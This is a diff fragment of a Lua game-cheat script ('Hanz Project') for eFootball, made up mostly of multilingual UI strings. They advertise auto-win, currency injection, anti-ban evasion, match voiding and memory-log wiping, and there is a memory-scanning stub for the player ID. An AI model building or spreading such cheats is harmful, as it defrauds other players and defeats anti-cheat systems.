+fast_link = "FAST LINK PROTOCOL",
+term_exit = "TAMATKAN / KELUAR",
+login_back = "LUPA KATA LALUAN",
+score_target = "Sasaran Skor: 3. Pastikan permainan tidak dalam PAUSE.",
+continue = "TERUSKAN",
+cancel = "BATAL",
+accel_win = "MEMACU KEMENANGAN...",
+system_stab = "SISTEM STABIL",
+proto_abort = "PROTOKOL DIBATALKAN",
+proto_fin = "PROTOKOL SELESAI",
+end_match = "TAMAT PERLAWANAN (SKIP MASA)",
+selector_title = "PEMILIH PEMBATALAN",
+delay_inst = "TANPA JEDA",
+delay_10 = "JEDA 10 SAAT",
+delay_30 = "JEDA 30 SAAT",
+delay_60 = "JEDA 60 SAAT",
+remaining = "TINGGAL",
+severed = "TERPUTUS",
+term_ok = "YA",
+term_no = "TIDAK",
+disc_in = "TERPUTUS DALAM",
+logo_premium = "🎀 H A N Z  P R O J E C T 🎀\n🧁 [V10.0 PINK EDITION] 🧁",
+msg_title = "PESAN DARIPADA HANZ",
+connect_btn = "◈ 🌸✨ SAMBUNG SEKARANG ✨🌸 ◈",
+start_now = "◈ 🌸✨ MULA SEKARANG ✨🌸 ◈",
+disconnect_btn = "◈ 🎀 TERPUTUS 🎀 ◈",
+sys_ok = "OK",
+sys_cancel = "BATAL",
+forgot_pass = "LUPA KATA LALUAN",
+calc_name = "KALKULATOR",
+calc_val1 = "NOMBOR PERTAMA (ATAS)",
+calc_val2 = "NOMBOR KEDUA (BAWAH)",
+calc_res = "KEPUTUSAN PENGIRAAN",
+calc_desc = "Pilih operasi matematik yang dikehendaki.",
+calc_mode = "PILIH MOD OPERASI",
+donate_title = "Sokong Developer (Donasi)",
+donate_msg = "Terima kasih atas sokongan anda! Sila pilih kaedah pembayaran.",
+donate_copied = "Maklumat telah disalin!",
+exit_choice = "DONASI & KELUAR",
+h_antiban = "ANTI BAN UPDATE FIX ✔",
+h_autowin = "MENANG AUTO SEMUA PERANTI ☐",
+h_online = "MENU DALAM TALIAN",
+h_offline = "MENU LUAR TALIAN",
+h_void = "BATAL PERLAWANAN (VOID)",
+h_epic = "LOBI PEMAIN EPIK",
+h_cond = "KONDISI PENUH (BIRU)",
+h_90fps = "AKTIFKAN 90 FPS",
+h_dribble = "HACK GELECEK (DRIBBLE)",
+h_aim = "AUTO SASAR GOL",
+h_penhack = "HACK PENALTI",
+h_nopen = "TANPA PENALTI",
+h_short = "PEMAIN PENDEK",
+h_tall = "PEMAIN TINGGI",
+h_weakgk = "PENJAGA GOL LEMAH"
+}
+elseif lang == 5 then -- JAPAN
+L = {
+welcome = "Hanz ネットワークへようこそ",
+ready = "システムの準備が完了しました。OKを押してリンクを確立してください。",
+status = "ステータス: 保護済み",
+pass_prompt = "パスワードを入力してください:",
+access_ok = "アクセス許可",
+access_fail = "アクセス拒否 / セキュリティ違反",
+contact = "データチップについては開発者に連絡してください。",
+init = "コアを初期化中...",
+back = "戻る",
+loading = "データ読み込み中",
+scanning = "IDスキャナー",
+granted = "アクセス許可",
+sync = "同期完了！",
+locked_title = "アクセス拒否",
+locked_msg = "申し訳ありませんが、この機能はプレミアム会員専用です。",
+p_order = "WHATSAPPで購入",
+p_tele = "TELEGRAMで購入",
+warp_init = "ワープドライブ準備中",
+warp_eng = "ワープドライブ始動！",
+sec_securing = "システムを保護中",
+sec_active = "ステルスモード有効",
+mem_wipe = "メモリログを消去しました",
+goal_ok = "ニューラルスコア注入: 3",
+goal_fail = "ノードが見つかりません",
+cancel_match = "試合の中止を開始",
+force_kill = "强制終了しますか？",
+shutdown = "シャットダウンプロトコル",
+idle_msg = "クリーンな切断を待機中",
+warp_speed = "ワープ速度有効",
+lang_label = "JAPANESE",
+op_label = "オペレーター: エリート・マーセナリー",
+page1 = "インターフェース選択 - ページ1",
+page2 = "神経診断 - ページ2",
+page3 = "その他のハックメニュー - ページ3",
+hack_other = "その他のハックメニュー",
+ping_jump = "ピングジャンプ",
+auto_win = "オートウィン",
+currency = "GP & E-コイン注入",
+cancel_m = "マッチキャンセル",
+f_kill = "強制終了",
+jack_out = "ジャックアウト",
+ice_breaker = "アイスブレイカー (アンチバン)",
+network = "ネットワーク (SNS)",
+scanner = "ディープスキャナー",
+tuner = "サイバーウェアチューナー",
+home_side = "ホーム側",
+away_side = "アウェイ側",
+config_title = "ピングジャンプ設定",
+inject_gp = "GPコイン注入 (最大 9.9億)",
+inject_coin = "E-コイン注入 (最大 99万)",
+currency_title = "通貨データ上書き",
+amt_prompt = "金額入力:",
+gp_ok = "GPデータを書き換えました",
+coin_ok = "E-コインデータを書き換えました",
+failed = "失敗",
+hw_opt = "ハードウェア最適化",
+overclock = "超频",
+fps_120 = "120 FPS設定",
+ram_clean = "RAMクリーン",
+new_scan = "新規スキャン",
+wipe_scan = "消去",
+fast_link = "ファストリンク・プロトコル",
+term_exit = "終了",
+login_back = "パスワードを忘れた",
+score_target = "ターゲットスコア: 3。一時停止していないことを確認してください。",
+continue = "続行",
+cancel = "キャンセル",
+accel_win = "勝利への加速中...",
+system_stab = "システム安定化完了",
+proto_abort = "プロトコル中止",
+proto_fin = "プロトコル完了",
+end_match = "マッチ終了 (タイムスキップ)",
+selector_title = "キャンセル待機時間選択",
+delay_inst = "遅延なし (即時)",
+delay_10 = "10秒遅延",
+delay_30 = "30秒遅延",
+delay_60 = "10秒遅延",
+remaining = "残り",
+severed = "切断完了",
+term_ok = "はい",
+term_no = "いいえ",
+disc_in = "切断まであと",
+logo_premium = "🎀 H A N Z  P R O J E C T 🎀\n🧁 [V10.0 PINK EDITION] 🧁",
+msg_title = "HANZからのメッセージ",
+connect_btn = "◈ 🌸✨ 今すぐ接続 ✨🌸 ◈",
+start_now = "◈ 🌸✨ 今すぐ開始 ✨🌸 ◈",
+disconnect_btn = "◈ 🎀 切断 🎀 ◈",
+sys_ok = "はい",
+sys_cancel = "キャンセル",
+forgot_pass = "パスワードを忘れた",
+calc_name = "計算機",
+calc_val1 = "最初の数字 (上)",
+calc_val2 = "二番目の数字 (下)",
+calc_res = "計算結果",
+calc_desc = "希望の数学演算を選択してください。",
+calc_mode = "操作モードを選択",
+donate_title = "開発者を支援する (寄付)",
+donate_msg = "ご支援ありがとうございます！支払い方法を選択してください。",
+donate_copied = "情報がクリップボードにコピーされました！",
+exit_choice = "寄付して終了",
+h_antiban = "アンチバン更新修正 ✔",
+h_autowin = "全端末オートウィン ☐",
+h_online = "オンラインメニュー",
+h_offline = "オフラインメニュー",
+h_void = "無効試合 (VOID)",
+h_epic = "エピックロビー",
+h_cond = "コンディション絶好調",
+h_90fps = "90 FPS 有効化",
+h_dribble = "ドリブルハック",
+h_aim = "オートエイムゴール",
+h_penhack = "PK ハック",
+h_nopen = "PK なしモード",
+h_short = "低身長化",
+h_tall = "高身長化",
+h_weakgk = "弱体化キーパー"
+}
+elseif lang == 6 then -- THAILAND
+L = {
+welcome = "ยินดีต้อนับสู่เครือข่าย Hanz",
+ready = "ระบบพร้อมแล้ว กด OK เพื่อเชื่อมต่อเนิวรัลลิงก์",
+status = "สถานะ: ปลอดภัย",
+pass_prompt = "กรุณาใส่รหัสผ่าน:",
+access_ok = "ได้รับอนุญาต",
+access_fail = "การเข้าถึงถูกปฏิเสธ / ละเมิดความปลอดภัย",
+contact = "ติดต่อ Netrunner เพื่อรับรหัสผ่าน",
+init = "กำลังเริ่มต้นคอร์...",
+back = "ย้อนกลับ",
+loading = "กำลังโหลดข้อมูล",
+scanning = "เครื่องสแกน ID",
+granted = "อนุญาตให้เข้าถึง",
+sync = "ซิงค์เสร็จสิ้น!",
+locked_title = "การเข้าถึงถูกปฏิเสธ",
+locked_msg = "ขออภัย ฟีเจอร์นี้สำหรับสมาชิกพรีเมียมเท่านั้น",
+p_order = "สั่งซื้อทาง WHATSAPP",
+p_tele = "ซื้อทาง TELEGRAM",
+warp_init = "กำลังเตรียมวาร์ปไดรฟ์",
+warp_eng = "วาร์ปไดรฟ์เริ่มทำงาน!",
+sec_securing = "กำลังรักษาความปลอดภัยระบบ",
+sec_active = "ระบบพรางตัวทำงาน",
+mem_wipe = "ล้างบันทึกหน่วยความจำแล้ว",
+goal_ok = "ฉีดคะแนนเนิวรัล: 3",
+goal_fail = "ไม่พบโหนด",
+cancel_match = "เริ่มการยกเลิกการแข่งขัน",
+force_kill = "บังคับปิดระบบ?",
+shutdown = "โปรโตคอลปิดเครื่อง",
+idle_msg = "รอการตัดการเชื่อมต่อ",
+warp_speed = "วาร์ปสปีดทำงาน",
+lang_label = "THAI",
+op_label = "ผู้ปฏิบัติการ: เอลีทเมิร์ค",
+page1 = "เลือกอินเทอร์เฟซ - หน้า 1",
+page2 = "การวินิจฉัยเนิวรัล - หน้า 2",
+page3 = "เมนูแฮ็กอื่นๆ - หน้า 3",
+hack_other = "เมนูแฮ็กอื่นๆ",
+ping_jump = "กระโดดปิง",
+auto_win = "ชนะอัตโนมัติ",
+currency = "ฉีด GP & E-COIN",
+cancel_m = "ยกเลิกแมตช์",
+f_kill = "บังคับปิด",
+jack_out = "ออกจากระบบ",
+ice_breaker = "ตัวทำลายไอซ์ (กันแบน)",
+network = "เครือข่ายโซเชียล",
+scanner = "เครื่องสแกนระดับลึก",
+tuner = "ตัวปรับแต่งไซเบอร์แวร์",
+home_side = "ฝั่งเจ้าบ้าน",
+away_side = "ฝั่งทีมเยือน",
+config_title = "ตั้งค่ากระโดดปิง",
+inject_gp = "ฉีด GP (สูงสุด 999 ล้าน)",
+inject_coin = "ฉีด E-COIN (สูงสุด 99 หมื่น)",
+currency_title = "แทนที่ข้อมูลสกุลเงิน",
+amt_prompt = "ใส่จำนวน:",
+gp_ok = "แก้ไขข้อมูล GP สำเร็จ",
+coin_ok = "แก้ไขข้อมูล E-COIN สำเร็จ",
+failed = "ล้มเหลว",
+hw_opt = "เพิ่มประสิทธิภาพฮาร์ดแวร์",
+overclock = "โอเวอร์คล็อก",
+fps_120 = "120 FPS",
+ram_clean = "ล้างแรม",
+new_scan = "สแกนใหม่",
+wipe_scan = "ล้างข้อมูล",
+fast_link = "โปรโตคอลลิงก์ด่วน",
+term_exit = "ยุติ / ออก",
+login_back = "ลืมรหัสผ่าน",
+score_target = "เป้าหมายคะแนน: 3 ห้ามกดหยุดเกม",
+continue = "ดำเนินการต่อ",
+cancel = "ยกเลิก",
+accel_win = "กำลังเร่งความเร็วสู่ชัยชนะ...",
+system_stab = "ระบบเสถียรแล้ว",
+proto_abort = "ยกเลิกโปรโตคอล",
+proto_fin = "เสร็จสิ้นโปรโตคอล",
+end_match = "จบแมตช์ (ข้ามเวลา)",
+selector_title = "เลือกการหน่วงเวลาการยกเลิก",
+delay_inst = "ทันที",
+delay_10 = "หน่วง 10 วินาที",
+delay_30 = "หน่วง 30 วินาที",
+delay_60 = "หน่วง 10 วินาที",
+remaining = "เหลืออีก",
+severed = "ตัดการเชื่อมต่อแล้ว",
+term_ok = "ใช่",
+term_no = "ไม่",
+disc_in = "ตัดการเชื่อมต่อใน",
+logo_premium = "🎀 H A N Z  P R O J E C T 🎀\n🧁 [V10.0 PINK EDITION] 🧁",
+msg_title = "ข้อความจาก HANZ",
+connect_btn = "◈ 🌸✨ เชื่อมต่อตอนนี้ ✨🌸 ◈",
+start_now = "◈ 🌸✨ เริ่มตอนนี้ ✨🌸 ◈",
+disconnect_btn = "◈ 🎀 ตัดการเชื่อมต่อ 🎀 ◈",
+sys_ok = "ตกลง",
+sys_cancel = "ยกเลิก",
+forgot_pass = "ลืมรหัสผ่าน",
+calc_name = "เครื่องคิดเลข",
+calc_val1 = "ตัวเลขแรก (บน)",
+calc_val2 = "ตัวเลขที่สอง (ล่าง)",
+calc_res = "ผลลัพธ์การคำนวณ",
+calc_desc = "เลือกการดำเนินการทางคณิตศาสตร์ที่ต้องการ",
+calc_mode = "เลือกโหมดการทำงาน",
+donate_title = "สนับสนุนนักพัฒนา (บริจาค)",
+donate_msg = "ขอบคุณสำหรับการสนับสนุน! โปรดเลือกวิธีการชำระเงิน",
+donate_copied = "คัดลอกข้อมูลแล้ว!",
+exit_choice = "บริจาคและออก",
+h_antiban = "แก้แบนอัปเดตใหม่ ✔",
+h_autowin = "ชนะอัตโนมัติทุกรุ่น ☐",
+h_online = "เมนูออนไลน์",
+h_offline = "เมนูออฟไลน์",
+h_void = "ทำให้แมตช์เป็นโมฆะ (VOID)",
+h_epic = "ล็อบบี้ผู้เล่นอีปิค",
+h_cond = "ความฟิตเต็ม (สีฟ้า)",
+h_90fps = "เปิดใช้งาน 90 FPS",
+h_dribble = "แฮ็กการเลี้ยงบอล",
+h_aim = "เล็งยิงประตูอัตโนมัติ",
+h_penhack = "แฮ็กจุดโทษ",
+h_nopen = "ไม่มีจุดโทษ",
+h_short = "ตัวละครเตี้ย",
+h_tall = "ตัวละครสูง",
+h_weakgk = "ผู้รักษาประตูอ่อนแอ"
+}
+elseif lang == 7 then -- VIETNAM
+L = {
+welcome = "Chào mừng đến với mạng lưới Hanz",
+ready = "Hệ thống đã sẵn sàng. Nhấn OK para kết nối liên kết thần kinh.",
+status = "TRẠNG THÁI: BẢO MẬT",
+pass_prompt = "NHẬP MẬT KHẨU:",
+access_ok = "TRUY CẬP ĐƯỢC CHẤP NHẬN",
+access_fail = "TRUY CẬP BỊ TỪ CHỐI / VI PHẠM BẢO MẬT",
+contact = "Liên hệ Netrunner para lấy mã truy cập.",
+init = "ĐANG KHỞI TẠO LÕI...",
+back = "QUAY LẠI",
+loading = "ĐANG TẢI DỮ LIỆU",
+scanning = "MÁY QUÉT ID",
+granted = "ĐÃ CẤP QUYỀN",
+sync = "ĐỒNG BỘ HOÀN TẤT!",
+locked_title = "TRUY CẬP BỊ TỪ CHỐI",
+locked_msg = "Xin lỗi, tính năng này chỉ dành cho Thành viên Premium.",
+p_order = "MUA QUA WHATSAPP",
+p_tele = "MUA QUA TELEGRAM",
+warp_init = "ĐANG CHUẨN BỊ WARP",
+warp_eng = "ĐỘNG CƠ WARP ĐÃ KÍCH HOẠT!",
+sec_active = "TÀI KHOẢN ẨN DANH ĐANG HOẠT ĐỘNG",
+sec_securing = "ĐANG BẢO MẬT HỆ THỐNG",
+mem_wipe = "ĐH XÓA NHẬT KÝ BỘ NHỚ",
+goal_ok = "ĐH TIÊM ĐIỂM SỐ: 3",
+goal_fail = "KHÔNG TÌM THẤY NODE",
+cancel_match = "BẮT ĐẦU HỦY TRẬN ĐẤU",
+force_kill = "BUỘC THOÁT HỆ THỐNG?",
+shutdown = "GIAO THỨC TẮT MÁY",
+idle_msg = "ĐANG CHỜ NGẮT KẾT NỐI",
+warp_speed = "TỐC ĐỘ WARP ĐANG HOẠT ĐỘNG",
+lang_label = "VIETNAMESE",
+op_label = "ĐIỀU HÀNH: ELITE MERC",
+page1 = "CHỌN GIAO DIỆN - TRANG 1",
+page2 = "CHẨN ĐOÁN THẦN KINH - TRANG 2",
+page3 = "MENU HACK KHÁC - TRANG 3",
+hack_other = "MENU HACK KHÁC",
+ping_jump = "NHẢY PING",
+auto_win = "THẮNG TỰ ĐỘNG",
+currency = "GP & E-COIN",
+cancel_m = "HỦY TRẬN ĐẤU",
+f_kill = "BUỘC THOÁT",
+jack_out = "ĐĂNG XUẤT",
+ice_breaker = "PHÁ BĂNG (ANTI-BAN)",
+network = "MẠNG XÃ HỘI",
+scanner = "QUÉT CHUYÊN SÂU",
+tuner = "TÙY CHỈNH CYBERWARE",
+home_side = "BÊN CHỦ NHÀ",
+away_side = "BÊN KHÁCH",
+config_title = "CẤU HÌNH NHẢY PING",
+inject_gp = "TIÊM GP (MAX 999.999.999)",
+inject_coin = "TIÊM E-COIN (MAX 999.999)",
+currency_title = "GHI ĐÈ TIỀN TỆ",
+amt_prompt = "NHẬP SỐ LƯỢNG:",
+gp_ok = "DỮ LIỆU GP ĐH GHI ĐÈ",
+coin_ok = "DỮ LIỆU E-COIN ĐH GHI ĐÈ",
+failed = "THẤT BẠI",
+hw_opt = "TỐI ƯU HÓA PHẦN CỨNG",
+overclock = "ÉP XUNG",
+fps_120 = "120 FPS",
+ram_clean = "DỌN RAM",
+new_scan = "QUÉT MỚI",
+wipe_scan = "XÓA",
+fast_link = "GIAO THỨC LIÊN KẾT NHANH",
+term_exit = "CHẤM DỨT / THOÁT",
+login_back = "QUÊN MẬT KHẨU",
+score_target = "Mục tiêu: 3. Đảm bảo game KHÔNG TẠM DỪNG.",
+continue = "TIẾP TỤC",
+cancel = "HỦY",
+accel_win = "ĐANG TĂNG TỐC CHIẾN THẮNG...",
+system_stab = "SISTEM STABIL",
+proto_abort = "ĐH HỦY GIAO THỨC",
+proto_fin = "HOÀN TẤT GIAO THỨC",
+end_match = "KẾT THÚC TRẬN (SKIP TIME)",
+selector_title = "CHỌN ĐỘ TRỄ HỦY TRẬN",
+delay_inst = "KHÔNG TRỄ (TỨC THÌ)",
+delay_10 = "TRỄ 10 GIÂY",
+delay_30 = "TRỄ 30 GIÂY",
+delay_60 = "TRỄ 10 GIÂY",
+remaining = "CÒN LẠI",
+severed = "ĐH NGẮT KẾT NỐI",
+term_ok = "CÓ",
+term_no = "KHÔNG",
+disc_in = "NGẮT KẾT NỐI TRONG",
+logo_premium = "🎀 H A N Z  P R O J E C T 🎀\n🧁 [V10.0 PINK EDITION] 🧁",
+msg_title = "TIN NHẮN TỪ HANZ",
+connect_btn = "◈ 🌸✨ KẾT NỐI NGAY ✨🌸 ◈",
+start_now = "◈ 🌸✨ BẮT ĐẦU NGAY ✨🌸 ◈",
+disconnect_btn = "◈ 🎀 NGẮT KẾT NỐI 🎀 ◈",
+sys_ok = "Đồng ý",
+sys_cancel = "Hủy",
+calc_name = "MÁY TÍNH",
+calc_val1 = "SỐ THỨ NHẤT (TRÊN)",
+calc_val2 = "SỐ THỨ HAI (DƯỚI)",
+calc_res = "KẾT QUẢ TÍNH TOÁN",
+calc_desc = "Chọn phép toán mong muốn.",
+calc_mode = "CHỌN CHẾ ĐỘ VẬN HÀNH",
+donate_title = "Hỗ trợ nhà phát triển (Quyên góp)",
+donate_msg = "Cảm ơn sự hỗ trợ của bạn! Vui lòng chọn phương thức thanh toán.",
+donate_copied = "Thông tin đã được sao chép!",
+exit_choice = "QUYÊN GÓP & THOÁT",
+h_antiban = "SỬA LỖI ANTI BAN CẬP NHẬT ✔",
+h_autowin = "THẮNG TỰ ĐỘNG MỌI THIẾT BỊ ☐",
+h_online = "MENU TRỰC TUYẾN",
+h_offline = "MENU NGOẠI TUYẾN",
+h_void = "HỦY TRẬN ĐẤU (VOID)",
+h_epic = "SẢNH NGƯỜI CHƠI EPIC",
+h_cond = "PHONG ĐỘ TỐI ĐA (XANH)",
+h_90fps = "KÍCH HOẠT 90 FPS",
+h_dribble = "HACK RÊ BÓNG",
+h_aim = "TỰ ĐỘNG NHẮM GÔN",
+h_penhack = "HACK PHẠT ĐỀN",
+h_nopen = "KHÔNG PHẠT ĐỀN",
+h_short = "CẦU THỦ LÙN",
+h_tall = "CẦU THỦ CAO",
+h_weakgk = "THỦ MÔN YẾU"
+}
+elseif lang == 8 then -- PHILIPPINES
+L = {
+welcome = "Maligayang pagdating sa Hanz Network",
+ready = "Handa na ang system. Pindutin ang OK para kumonekta sa neural link.",
+status = "STATUS: LIGTAS",
+pass_prompt = "ILAGAY ANG PASSWORD:",
+access_ok = "TINANGGAP ANG ACCESS",
+access_fail = "TINANGGIHAN ANG ACCESS / SECURITY BREACH",
+contact = "Makipag-ugnayan sa Netrunner para sa key.",
+init = "NAG-I-INITIALIZE NG CORE...",
+back = "BUMALIK",
+loading = "NAGLO-LOAD NG DATA",
+scanning = "ID SCANNER",
+granted = "PINAYAGAN ANG ACCESS",
+sync = "TAPOS NA ANG SYNC!",
+locked_title = "DENIED ANG ACCESS",
+locked_msg = "Paumanhin, ang feature na ito ay para lamang sa Premium Members.",
+p_order = "ORDER SA WHATSAPP",
+p_tele = "BUMILI SA TELEGRAM",
+warp_init = "NAGHAHANDA NG WARP DRIVE",
+warp_eng = "WARP DRIVE ENGAGED!",
+sec_securing = "NAGSESECURE NG SYSTEM",
+sec_active = "NEURAL STEALTH ACTIVE",
+mem_wipe = "MEMORY LOGS NILINIS",
+goal_ok = "NEURAL SCORE INJECTED: 3",
+goal_fail = "HINDI NAHANAP ANG NODE",
+cancel_match = "SINISIMULAN ANG PAG-CANCEL NG MATCH",
+force_kill = "I-FORCE KILL ANG SYSTEM?",
+shutdown = "SHUTDOWN PROTOCOL",
+idle_msg = "NAGHIHINTAY NG DISCONNECT",
+warp_speed = "WARP SPEED ACTIVE",
+lang_label = "TAGALOG",
+op_label = "OPERATOR: ELITE MERC",
+page1 = "PILIIN ANG INTERFACE - PAGE 1",
+page2 = "NEURAL DIAGNOSTICS - PAGE 2",
+page3 = "IBANG HACK MENU - PAGE 3",
+hack_other = "IBANG HACK MENU",
+ping_jump = "PING JUMP",
+auto_win = "AUTO WIN",
+currency = "GP & E-COIN",
+cancel_m = "I-CANCEL ANG MATCH",
+f_kill = "FORCE KILL",
+jack_out = "JACK OUT",
+ice_breaker = "ICE BREAKER (ANTI-BAN)",
+network = "NETWORK (SOSMED)",
+scanner = "DEEP SCANNER",
+tuner = "CYBERWARE TUNER",
+home_side = "HOME SIDE",
+away_side = "AWAY SIDE",
+config_title = "PING JUMP CONFIG",
+inject_gp = "INJECT GP (MAX 999.999.999)",
+inject_coin = "INJECT E-COIN (MAX 999.999)",
+currency_title = "NEURAL CURRENCY OVERRIDE",
+amt_prompt = "ILAGAY ANG AMOUNT:",
+gp_ok = "GP DATA OVERRIDDEN",
+coin_ok = "E-COIN DATA OVERRIDDEN",
+failed = "GAGAL / FAILED",
+hw_opt = "HARDWARE OPTIMIZATION",
+overclock = "OVERCLOCK",
+fps_120 = "120 FPS",
+ram_clean = "LINIS RAM",
+new_scan = "BAGONG SCAN",
+wipe_scan = "BURAHIN",
+fast_link = "FAST LINK PROTOCOL",
+term_exit = "ITIGIL / LUMABAS",
+login_back = "NAKALIMUTAN ANG PASSWORD",
+score_target = "Target Score: 3. Siguraduhing HINDI PAUSE ang game.",
+continue = "ITULOY",
+cancel = "I-CANCEL",
+accel_win = "NAGPAPABILIS PARA MANALO...",
+system_stab = "STABLE NA ANG SYSTEM",
+proto_abort = "PROTOCOL ABORTED",
+proto_fin = "PROTOCOL TAPOS NA",
+end_match = "TAPUSIN ANG MATCH (TIME SKIP)",
+selector_title = "CANCEL MATCH SELECTOR",
+delay_inst = "WALANG DELAY",
+delay_10 = "DELAY 10 SECONDS",
+delay_30 = "DELAY 30 SECONDS",
+delay_60 = "DELAY 10 SECONDS",
+remaining = "NATITIRA",
+severed = "PUTOL NA ANG LINK",
+term_ok = "OO",
+term_no = "HINDI",
+disc_in = "MAWAWALA SA LOOB NG",
+logo_premium = "🎀 H A N Z  P R O J E C T 🎀\n🧁 [V10.0 PINK EDITION] 🧁",
+msg_title = "MENSAHE MULA KAY HANZ",
+connect_btn = "◈ 🌸✨ KUMONEKTA NA ✨🌸 ◈",
+start_now = "◈ 🌸✨ SIMULAN NA ✨🌸 ◈",
+disconnect_btn = "◈ 🎀 PUTOL 🎀 ◈",
+sys_ok = "Sige",
+sys_cancel = "Kanselahin",
+forgot_pass = "NAKALIMUTAN ANG PASSWORD",
+calc_name = "KALKULATOR",
+calc_val1 = "UNANG NUMERO (ITAAS)",
+calc_val2 = "PANGALAWANG NUMERO (IBABA)",
+calc_res = "RESULTA NG PAGKUKUENTA",
+calc_desc = "Piliin ang nais na operasyon sa matematika.",
+calc_mode = "PUMILI NG OPERATION MODE",
+donate_title = "Suportahan ang Developer (Donasyon)",
+donate_msg = "Salamat sa iyong suporta! Mangyaring pumili ng paraan ng pagbabayad.",
+donate_copied = "Nakopya na ang impormasyon!",
+exit_choice = "DONASYON & EXIT",
+h_antiban = "ANTI BAN UPDATE FIX ✔",
+h_autowin = "AUTO WIN SA LAHAT NG GADGET ☐",
+h_online = "MENU NG ONLINE",
+h_offline = "MENU NG OFFLINE",
+h_void = "VOID ANG MATCH",
+h_epic = "EPIC PLAYER LOBBY",
+h_cond = "FULL KONDISYON",
+h_90fps = "BUKSAN ANG 90 FPS",
+h_dribble = "HACK SA PAG-GELECEK",
+h_aim = "AUTO AIM SA GOAL",
+h_penhack = "HACK SA PENALTY",
+h_nopen = "WALANG PENALTY",
+h_short = "PANDAK NA MANLALARO",
+h_tall = "MATANGKAD NA MANLALARO",
+h_weakgk = "MAHINANG KIPER"
+}
+elseif lang == 9 then -- ARABIC
+L = {
+welcome = "مرحباً بك في شبكة هانز",
+ready = "النظام جاهز. اضغط موافق لتفعيل الارتباط العصبي.",
+status = "الحالة: محمي",
+pass_prompt = "أدخل كلمة المرور:",
+access_ok = "تم قبول الوصول",
+access_fail = "تم رفض الوصول / خرق أمني",
+contact = "اتصل بـ Netrunner للحصول على المفاتيح.",
+init = "بدء تشغيل النواة...",
+back = "رجوع",
+loading = "جاري رفع البيانات",
+scanning = "الفحص العصبي",
+granted = "تم منح الوصول",
+sync = "اكتملت المزامنة!",
+locked_title = "الوصول مرفوض",
+locked_msg = "عذراً، هذه الميزة للأعضاء المميزين فقط.",
+p_order = "شراء عبر واتساب",
+p_tele = "شراء عبر تليجرام",
+warp_init = "جاري تحضير القفزة الفضائية",
+warp_eng = "محرك القفزة نشط!",
+sec_securing = "تأمين النظام",
+sec_active = "تخفي الارتباط العصبي نشط",
+mem_wipe = "تم مسح سجلات الذاكرة",
+goal_ok = "تم حقن النتيجة: 3",
+goal_fail = "لم يتم العثور على العقدة",
+cancel_match = "بدء بروتوكول إلغاء اللعبة",
+force_kill = "إغلاق إجباري للنظام؟",
+shutdown = "بروتوكول الإيقاف",
+idle_msg = "بانتظار قطع الاتصال النظيف",
+warp_speed = "سرعة القفزة نشطة",
+lang_label = "ARABIC",
+op_label = "المشغل: مرتزق النخبة",
+page1 = "اختر الواجهة - صفحة 1",
+page2 = "التشخيص العصبي - صفحة 2",
+page3 = "قائمة اختراقات أخرى - صفحة 3",
+hack_other = "قائمة اختراقات أخرى",
+ping_jump = "قفزة البنج",
+auto_win = "فوز تلقائي",
+currency = "عملات GP و E-COIN",
+cancel_m = "إلغاء المباراة",
+f_kill = "إغلاق إجباري",
+jack_out = "خروج",
+ice_breaker = "كاسر الجليد (مضاد الباند)",
+network = "الشبكة (سوشيال)",
+scanner = "الماسح العميق",
+tuner = "ضبط السايبروير",
+home_side = "جانب المضيف",
+away_side = "جانب الضيف",
+config_title = "إعدادات قفزة البنج",
+inject_gp = "حقن عملات GP",
+inject_coin = "حقن عملات E-COIN",
+currency_title = "تجاوز العملة العصبية",
+amt_prompt = "أدخل الكمية:",
+gp_ok = "تم تعديل بيانات GP",
+coin_ok = "تم تعديل بيانات E-Coin",
+failed = "فشل",
+hw_opt = "تحسين الأجهزة",
+overclock = "كسر السرعة",
+fps_120 = "120 إطار",
+ram_clean = "تنظيف الرام",
+new_scan = "فحص جديد",
+wipe_scan = "مسح",
+fast_link = "بروتوكول الارتباط السريع",
+term_exit = "إنهاء / خروج",
+login_back = "نسيت كلمة المرور",
+score_target = "الهدف: 3. تأكد أن اللعبة ليست في وضع التوقف.",
+continue = "استمرار",
+cancel = "إلغاء",
+accel_win = "جاري تسريع الفوز...",
+system_stab = "النظام مستقر",
+proto_abort = "تم إلغاء البروتوكول",
+proto_fin = "اكتمل البروتوكول",
+end_match = "إنهاء (تخطي الوقت)",
+selector_title = "محدد إلغاء اللعبة",
+delay_inst = "بدون تأخير (فوري)",
+delay_10 = "تأخير 10 ثواني",
+delay_30 = "تأخير 30 ثانية",
+delay_60 = "تأخير 10 ثواني",
+remaining = "المتبقي",
+severed = "انقطع الارتباط",
+term_ok = "نعم",
+term_no = "لا",
+disc_in = "سيتم الفصل خلال",
+logo_premium = "🎀 مشروع هانز 🎀\n🧁 [الإصدار الوردي V10.0] 🧁",
+msg_title = "رسالة من هانز",
+connect_btn = "◈ 🌸✨ الاتصال الآن ✨🌸 ◈",
+start_now = "◈ 🌸✨ ابدأ الآن ✨🌸 ◈",
+disconnect_btn = "◈ 🎀 فصل 🎀 ◈",
+sys_ok = "موافق",
+sys_cancel = "إلغاء",
+forgot_pass = "نسيت كلمة المرور",
+calc_name = "حاسبة",
+calc_val1 = "الرقم الأول (أعلى)",
+calc_val2 = "الرقم الثاني (أسفل)",
+calc_res = "النتيجة",
+calc_desc = "اختر العملية الحسابية المطلوبة.",
+calc_mode = "اختر وضع التشغيل",
+donate_title = "دعم المطور (تبرع)",
+donate_msg = "شكراً لدعمك! يرجى اختيار طريقة الدفع.",
+donate_copied = "تم نسخ المعلومات!",
+exit_choice = "تبرع وخروج",
+h_antiban = "إصلاح الحظر (تحديث) ✔",
+h_autowin = "فوز تلقائي لكل الأجهزة ☐",
+h_online = "قائمة الأونلاين",
+h_offline = "قائمة الأوفلاين",
+h_void = "إلغاء المباراة (فوييد)",
+h_epic = "لوبي اللاعبين الأسطوريين",
+h_cond = "حالة كاملة (أزرق)",
+h_90fps = "تفعيل 90 إطار",
+h_dribble = "هكر المراوغة",
+h_aim = "توجيه تلقائي للمرمى",
+h_penhack = "هكر ركلات الجزاء",
+h_nopen = "بدون ركلات جزاء",
+h_short = "لاعبون قصار القامة",
+h_tall = "لاعبون طوال القامة",
+h_weakgk = "حارس مرمى ضعيف"
+}
+end
+end
+
+-- [[ 🧬 DEEP NEURAL SCANNER: EFOOTBALL ID ]] --------------------
+
+function GetRealEfootballID()
+if saved_ef_id then return saved_ef_id end
+local found_id = nil
+local symbols = {"🌸", "💖", "✨", "🎀", "🍭"}
+local load_msg = L.scanning or "SEARCHING NEURAL ID"
+for i = 1, 100 do
+local sym = symbols[(math.floor(i/5) % #symbols) + 1]
+local progress = i
+local fill = math.floor(progress / 10)
